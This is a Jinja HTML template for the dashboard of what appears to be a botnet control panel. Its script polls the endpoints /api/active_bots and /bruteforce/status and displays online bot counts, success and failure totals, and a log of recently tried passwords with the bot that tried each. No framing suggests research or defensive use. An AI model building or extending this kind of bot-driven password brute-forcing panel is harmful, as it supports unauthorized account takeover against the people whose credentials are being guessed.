{% extends "base.html" %}
{% block title %}Home{% endblock %}
{% block content %}
<div class="page-title">Dashboard Overview</div>
<div style="display:grid; grid-template-columns: repeat(4,1fr); gap:20px; margin-bottom:30px;">
    <div style="background:#fff; padding:20px; border-radius:10px; border:1px solid #e2e8f0;">
        <div style="font-size:28px; font-weight:700; color:#4a6cf7;" id="statBots">0</div>
        <div style="color:#718096; font-size:13px;">Online Nodes</div>
    </div>
    <div style="background:#fff; padding:20px; border-radius:10px; border:1px solid #e2e8f0;">
        <div style="font-size:28px; font-weight:700; color:#2d3748;" id="statTotal">0</div>
        <div style="color:#718096; font-size:13px;">Total Nodes</div>
    </div>
    <div style="background:#fff; padding:20px; border-radius:10px; border:1px solid #e2e8f0;">
        <div style="font-size:28px; font-weight:700; color:#38a169;" id="statSuccess">0</div>
        <div style="color:#718096; font-size:13px;">Success</div>
    </div>
    <div style="background:#fff; padding:20px; border-radius:10px; border:1px solid #e2e8f0;">
        <div style="font-size:28px; font-weight:700; color:#e53e3e;" id="statFail">0</div>
        <div style="color:#718096; font-size:13px;">Failed</div>
    </div>
</div>
<div style="background:#fff; border:1px solid #e2e8f0; border-radius:10px; padding:20px;">
    <h3 style="font-weight:500; margin-bottom:10px;">Recent Activity</h3>
    <div id="recentLog" style="font-family:monospace; font-size:13px; color:#4a5568;">No recent activity.</div>
</div>
<script>
    async function fetchStats() {
        try {
            const r = await fetch('/api/active_bots');
            const bots = await r.json();
            document.getElementById('statBots').innerText = bots.filter(b => b.online).length;
            document.getElementById('statTotal').innerText = bots.length;
        } catch(e) {}
        try {
            const r = await fetch('/bruteforce/status');
            const data = await r.json();
            document.getElementById('statSuccess').innerText = data.success || 0;
            document.getElementById('statFail').innerText = data.failed || 0;
            if (data.results && data.results.length) {
                const last = data.results.slice(-3);
                document.getElementById('recentLog').innerHTML = last.map(l => 
                    `<div style="padding:4px 0; border-bottom:1px solid #f0f0f0;">${l.time} | ${l.bot_id} | ${l.password} | ${l.success ? '✅' : '❌'}</div>`
                ).join('');
            }
        } catch(e) {}
    }
    setInterval(fetchStats, 3000);
    fetchStats();
</script>
{% endblock %}
